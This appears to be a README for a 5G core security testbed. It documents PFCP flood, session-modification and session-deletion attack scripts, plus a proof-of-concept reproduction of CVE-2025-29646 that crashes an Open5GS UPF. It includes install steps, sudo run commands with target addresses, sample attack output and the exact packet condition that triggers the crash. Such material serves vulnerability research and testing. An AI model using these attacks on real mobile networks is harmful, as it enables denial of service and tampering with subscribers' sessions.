For the PFCP flood attack, PFCP modification and PFCP deletion scripts, we used and slightly modified the code from : 
    -   https://gitlab.com/k3y/sancus-pfcp-attacks/-/tree/main/PFCP%20Flood%20Attack?ref_type=heads#requirements

## Prérequis

The script requires the following Python libraries :
- `scapy`
- `faker`

### Installation Steps

1. ** Update and refresh repository lists :**
   ```bash
   sudo apt update
   sudo apt install software-properties-common
   sudo add-apt-repository ppa:deadsnakes/ppa
   sudo apt update
   sudo apt install python3.8
   sudo apt install python3-pip -y
   pip3 install scapy
   pip3 install faker


# Example for PFCP Flood Attack Script

This script executes a PFCP flood attack using the Python libraries `scapy` and `faker`. It generates random network traffic using the IP addresses provided as parameters.
#### The following parameters are utilised by the script:
1. PFCP_CP_IP_V4: The IPv4 address of the PFCP control plain (SMF). This parameter is provided as a command-line argument.
2. PFCP_UP_IP_V4: The IPv4 address of the PFCP user plain (UPF). This parameter is provided as a command-line argument.
3. N3_IP_V4: The IPv4 address of the N3 interface network. This parameter is provided as a command-line argument.
4. GNB_IP_V4: The IPv4 address of the gNB. This parameter is provided as a command-line argument.
5. UE_IP_V4: The IPv4 address of the UE. This parameter is currently generated randomly, along with the Session ID.

The required parameters can be passed into the script as arguments.
The sole file to implement this attack is the pfcp-Flood.py script.
Please navigate to the directory containing the file and execute it with sudo privileges whilst providing the required arguments:

    sudo python3 pfcp-Flood.py <PFCP_CP_IP_V4> <PFCP_UP_IP_V4> <N3_IP_V4> <GNB_IP_V4>
#### Ex:

    sudo python3 pfcp-Flood.py 192.187.3.3 192.187.3.6 192.187.3.0 193.187.3.253
The output of the command will be:

    ~$sudo python3 pfcp-Flood.py 192.187.3.3 192.187.3.6 192.187.3.0 193.187.3.253
    Starting traffic generation with the following parameters:

    PFCP_CP_IP_V4 = 192.187.3.3
    PFCP_UP_IP_V4 = 192.187.3.6
    N3_IP_V4 = 192.187.3.0
    GNB_IP_V4 = 193.187.3.253

    UE IP address and SEID are randomly generated

    Press Enter to continue...

    2022-04-28 20:22:20,134 - __main__ - INFO - REQ: <PFCPHeartbeatRequest  IE_list=[<IE_RecoveryTimeStamp  timestamp=3860166140 |>] |>
    .
    Sent 1 packets.
    2022-04-28 20:22:20,224 - __main__ - INFO - REQ: <PFCPSessionEstablishmentRequest  IE_list=[<IE_CreateFAR  IE_list=[<IE_ApplyAction  FORW=1 |>, <IE_FAR_Id  id=1 |>] |>, <IE_CreatePDR  IE_list=[<IE_FAR_Id  id=1 |>, <IE_PDI  IE_list=[<IE_NetworkInstance  instance='access' |>, <IE_SDF_Filter  FD=1 flow_description='permit out ip from any to assigned' |>, <IE_SourceInterface  interface=Access |>, <IE_UE_IP_Address  SD=0 V4=1 ipv4=45.45.0.4 |>, <IE_FTEID  V4=1 TEID=0x457 ipv4=193.187.3.0 |>] |>, <IE_PDR_Id  id=1 |>, <IE_Precedence  precedence=200 |>, <IE_OuterHeaderRemoval  |>] |>, <IE_CreateFAR  IE_list=[<IE_ApplyAction  FORW=1 |>, <IE_FAR_Id  id=2 |>, <IE_ForwardingParameters  IE_list=[<IE_DestinationInterface  interface=Access |>, <IE_NetworkInstance  instance='n6' |>, <IE_OuterHeaderCreation  GTPUUDPIPV4=1 TEID=0x8ae ipv4=193.187.3.253 |>] |>] |>, <IE_CreatePDR  IE_list=[<IE_FAR_Id  id=2 |>, <IE_PDI  IE_list=[<IE_NetworkInstance  instance='n6' |>, <IE_SourceInterface  interface=Core |>, <IE_UE_IP_Address  SD=1 V4=1 ipv4=45.45.0.4 |>] |>, <IE_PDR_Id  id=2 |>, <IE_Precedence  precedence=200 |>, <IE_OuterHeaderRemoval  |>] |>, <IE_FSEID  v4=1 seid=0x82167cb35b03e373 ipv4=192.187.3.3 |>, <IE_NodeId  id_type=FQDN id='cp' |>] |>
    .
    Sent 1 packets.
    2022-04-28 20:22:20,272 - __main__ - INFO - REQ: <PFCPHeartbeatRequest  IE_list=[<IE_RecoveryTimeStamp  timestamp=3860166140 |>] |>
    .
    ...

# PFCP Modification attack

Run the bash code `modification.sh` with the number or desired target as argument. 

# PFCP Deletion attack

Run the python code `pfcp-Session-deletion-flag.py` with SMF_IP UPF_IP interface

# UPF  PDN-0  Fault

Change smf_ip & upf_ip in the script and run python3 pfcp-pdn.py


# PFCP  Restoration-TEID

This attack is a reproduction of the CVE-2025-29646, see https://nvd.nist.gov/vuln/detail/CVE-2025-29646, https://github.com/open5gs/open5gs/issues/3747 for more informations.

## Steps to reproduce

Sending a pfcp NewSessionEstablishmentRequest packet with restoration_indication = true and (teid = 0 or teid > ogs_pfcp_pdr_teid_pool.size) would cause the UPF to reach an assertion in line 1365 of lib/pfcp/context.c and crash. The size of ogs_pfcp_pdr_teid_pool is max_ue * 4 * 16. The issue can be reproduced by starting the upf only.

    1. start a new go project inside a new folder: go mod init ogs_poc
    2. move the main_cve_2025-29646.go into the folder :
    3. download required libraries: go mod tidy
    4. run the program with the upf pfcp server address: go run main_cve_2025-29646.go ip_upf_pfcp


